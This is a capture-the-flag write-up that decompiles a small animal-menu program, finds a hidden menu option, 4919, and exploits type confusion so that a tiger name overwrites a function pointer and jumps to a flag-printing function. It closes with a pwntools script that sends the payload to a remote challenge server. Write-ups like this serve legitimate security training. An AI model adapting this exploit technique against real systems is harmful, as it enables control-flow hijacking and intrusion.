Here we have a program with which we can create three types of animals (lion, tiger, bear).
The animals can be created with a menu and each animal has a type and a name.
A maximum of 4 animals can be created and animals can also be deleted. 

If we run the program we get something like :

	Welcome! I don't think we're in Kansas anymore.
	We're about to head off on an adventure!
	Select some animals you want to bring along.

	Menu Options:
	1: Bring a lion
	2: Bring a tiger
	3: Bring a bear
	4: Delete Animal
	5: Exit

	Enter your choice:
	$ 1
	Choose the type of lion you want:
	1: Congo Lion
	2: Barbary Lion
	$ 1
	Enter name of lion:
	$ SomeLionName

	Menu Options:
	1: Bring a lion
	2: Bring a tiger
	3: Bring a bear
	4: Delete Animal
	5: Exit

	...


If we open the code with IDA, we find this function to print the flag :

	__int64 l33tH4x0r()
	{
	  FILE *stream; // ST08_8@1
	  char s; // [sp+10h] [bp-40h]@1
	  __int64 v3; // [sp+48h] [bp-8h]@1

	  v3 = *MK_FP(__FS__, 40LL);
	  stream = fopen("flag.txt", "r");
	  fgets(&s, 50, stream);
	  puts(&s);
	  fflush(stdout);
	  fclose(stream);
	  return *MK_FP(__FS__, 40LL) ^ v3;
	}

We find in the assembly that its address is 0x40090D which will be useful later.

We also find that in the makeStuff function there is a call to pwnMe() :

	int makeStuff()
	{
	  int result; // eax@10
	  unsigned int v1; // [sp+Ch] [bp-4h]@1

	  puts("Enter your choice:");
	  fflush(stdout);
	  __isoc99_scanf(4198424LL, &v1);
	  getchar();
	  if ( v1 == 3 )
	  {
	    result = makeBear(4198424LL, &v1);
	  }
	  else if ( (signed int)v1 > 3 )
	  {
	    if ( v1 == 5 )
	      exit(0);
	    if ( (signed int)v1 >= 5 )
	    {
	      if ( v1 == 4919 )
	        pwnMe();   // <----- HERE -----
	LABEL_16:
	      printf("Invalid choice :(   %d\n", v1);
	      exit(0);
	    }
	    result = deleteAnimal(4198424LL, &v1);
	  }

	  ...

	}

This tells us that to call pwnMe, we need to choose the Menu Option 4919.

The pwnMe function looks like that :

	void __noreturn pwnMe()
	{
	  __int64 v0; // [sp+0h] [bp-10h]@1

	  v0 = (__int64)*(&pointers + bearOffset);
	  if ( *(_DWORD *)(v0 + 20) == 3 )
	    (*(void (**)(void))v0)();
	  exit(0);
	}

So if the 20th byte after the address v0 (v0[20]) is 3, the program calls the function
at the address written at v0 (the first word, so 4 bytes of v0).

If we can replace the first word of v0 with 0x40090D (the address of l33tH4x0r),
we can print the flag.

If we don't create any bear, v0 will point at the buffer at the first address in pointers.


Now let's look at makeTiger : 
	__int64 makeTiger()
	{
	  char *s; // ST08_8@1

	  s = (char *)malloc(0x18uLL);
	  *((_DWORD *)s + 5) = pickTigerType();
	  puts("Enter name of tiger:");
	  fflush(stdout);
	  fgets(s, 20, stdin);
	  *(&pointers + next) = s;
	  return (unsigned int)(next++ + 1);
	}

We see that when we create a Tiger, a buffer of 32 bytes is allocated and
the 5th word of the buffer is the tigerType.

The first address in pointers is then the address of this buffer because next is 0 initially.

So if we want to pwnMe to work, we need to choose 3 as the Tiger Type (the fifth word will be three,
so the 20th byte after &pointers will be also 3 and the function in v0 will be called).

We can also see that the name writes directly at the beginning of this buffer, so we can directly write
the address to jump to (0x40090D) as the name. However, since 0D is a carriage return, this will pose
problem in our script. We can still jump a little bit further so the address can be written to the program.
We chose to jump to the next address and this will still work since nothing much is done in the first instruction.
We will then jump to 0x40090E.

We can retrieve the flag with this python script :

	from pwn import *

	# the address to jump to to print the flag
	l33tH4x0r_addr = 0x40090E

	# remote interaction with the program
	with remote('104.155.227.252', 25050) as p:
		print p.recvuntil('choice:')
		p.sendline('2') # tiger
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('tiger:')
		p.sendline(p64(l33tH4x0r_addr))

		# pwnMe
		print p.recvuntil('choice:')
		p.sendline('4919')

		print p.recvall()